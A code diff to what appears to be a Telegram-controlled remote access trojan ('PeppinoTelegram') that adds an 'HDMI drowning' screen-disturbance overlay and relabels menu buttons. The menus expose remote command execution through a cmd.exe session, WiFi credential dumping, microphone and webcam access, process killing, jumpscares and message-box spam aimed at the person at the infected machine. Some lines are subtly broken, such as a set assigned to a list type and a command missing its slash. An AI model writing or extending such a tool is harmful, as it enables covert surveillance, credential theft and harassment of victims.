@@ -70,11 +70,13 @@ from os.path import join, abspath, isfile, exists, dirname, realpath, split as p
 
 #UTILS
 import pyngrok
-from utils.tunnel_handler import *
-from utils.duckyscript import toducky
-from utils.mymixer import CustomMixer
-from utils.wifidumper import WifiDumper
-from utils.cmdsession import CMDSession
+from utils import *
+from utils import toducky
+from utils import CustomMixer
+from utils import WifiDumper
+from utils import CMDSession
+from utils import HDMIDrownedOverlay
+
 
 def resource_path(relative_path: str) -> str:
     if getattr(sys, 'frozen', False):
@@ -304,6 +306,7 @@ messagebox - Show a custom message box.
 messagespam - Spam message boxes.
 camerawallpaper - Sets webcam's frames as wallpaper.
 setvideowallpaper - Sets a video as wallpaper.
+hdmi_drowning_effect - Sets an noise/disturbed effect overlay on screen.
 
 💻 System Control
 execute - Run system command.
@@ -869,6 +872,8 @@ class PeppinoTelegram:
         self.mainmenu_ref = None
         self.wifidumper = WifiDumper()
         self.all_session_messages: list[int] = []
+
+        self.overlays: list[OverlayPlayer] = set()
 
         self.cmd_session = CMDSession("cmd.exe /K cd /d %USERPROFILE%'")
         self.cmd_session_active: bool = False
@@ -1568,12 +1573,12 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             "📢 Pss": "/pss",
             "🔔 Urltoast": "/urltoast",
             "🎙️ Microphone": "/microphone",
-            "🔇 Mutevolume": "/mutevolume",
-            "🔊 Fullvolume": "/fullvolume",
-            "🎚️ Setvolume": "/setvolume",
-            "📈 Getvolume": "/getvolume",
-            "🎶 Tralalerotralala": "/tralalerotralala",
-            "🎛️ Mixermenu": "/mixermenu",
+            "🔇 Mute volume": "/mutevolume",
+            "🔊 Full volume": "/fullvolume",
+            "🎚️ Set volume": "/setvolume",
+            "📈 Get volume": "/getvolume",
+            "🎶 Tralalero tralala": "/tralalerotralala",
+            "🎛️ Mixer menu": "/mixermenu",
         }
 
         if self.mainmenu_ref:
@@ -1585,13 +1590,14 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         buttons = {
             "🔙 Back": "/mainmenu",
             "👻 Jumpscare": "/jumpscare",
-            "😶‍🌫️ Jumpscarenoaudio": "/jumpscarenoaudio",
-            "🔄 Invertedscreen": "/invertedscreen",
-            "🌀 Distortedscreen": "/distortedscreen",
-            "💬 Messagebox": "/messagebox",
-            "📨 Messagespam": "/messagespam",
-            "📷 Camerawallpaper": "/camerawallpaper",
-            "🎞️ Setvideowallpaper": "/setvideowallpaper",
+            "😶‍🌫️ Jumpscare noaudio": "/jumpscarenoaudio",
+            "🔄 Inverted screen": "/invertedscreen",
+            "🌀 Distorted screen": "/distortedscreen",
+            "💬 Message box": "/messagebox",
+            "📨 Message spam": "/messagespam",
+            "📷 Camera wallpaper": "/camerawallpaper",
+            "🎞️ Set video wallpaper": "/setvideowallpaper",
+            "🖥️🌀 Hdmi Drowning Effect":"hdmi_drowning_effect",
         }
 
         if self.mainmenu_ref:
@@ -1603,11 +1609,11 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         buttons = {
             "🔙 Back": "/mainmenu",
             "⚙️ Execute": "/execute",
-            "💀 Processkiller": "/processkiller",
-            "🛑 Terminateprocess": "/terminateprocess",
-            "📊 Procmonmenu": "/procmonmenu",
-            "➕ Procmonadd": "/procmonadd",
-            "➖ Procmonrem": "/procmonrem",
+            "💀 Process killer": "/processkiller",
+            "🛑 Terminate process": "/terminateprocess",
+            "📊 Procmon menu": "/procmonmenu",
+            "➕ Procmon add": "/procmonadd",
+            "➖ Procmon remomve": "/procmonrem",
             "</> CMDSession": "/cmdsession"
         }
         if self.mainmenu_ref:
